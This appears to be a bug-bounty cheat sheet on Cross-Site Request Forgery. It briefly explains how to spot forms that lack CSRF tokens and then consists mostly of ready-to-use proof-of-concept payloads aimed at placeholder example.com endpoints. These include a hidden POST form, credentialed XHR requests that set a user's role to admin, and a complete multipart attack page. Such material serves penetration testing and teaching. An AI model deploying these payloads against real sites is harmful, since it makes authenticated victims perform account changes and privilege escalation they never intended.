# Cross Site Request Forgery (CSRF)

## Introduction
Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated

## Where to find
Usually found in forms. Try submit the form and check the HTTP request. If the HTTP request does not have a CSRF token then it is likely to be vulnerable to a CSRF attack. But in some cases, the CSRF token can be bypassed, try check this [List](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20CSRF.md)

## How to exploit
1. HTML GET Method

```html
<a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
```

2. HTML POST Method

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="uname" />
 <input type="submit" value="Submit Request" />
</form>
```

3. JSON GET Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

4. JSON POST Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

5. Multipart request
```html
<head>
    <title>Multipart CSRF PoC</title>
</head>
<body>
<br>
<hr>
<h2>Click Submit request</h2><br>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://example/api/users", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------149631704917378");
        xhr.withCredentials = true;
        var body = "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"action\"\r\n" + 
          "\r\n" + 
          "update\r\n" + 
          "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"user_id\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"uname\"\r\n" + 
          "\r\n" + 
          "daffainfo\r\n" + 
          "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"first_name\"\r\n" + 
          "\r\n" + 
          "m\r\n" + 
          "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"last_name\"\r\n" + 
          "\r\n" + 
          "daffa\r\n" + 
          "-----------------------------149631704917378--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
	<form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
<br>
</body>
```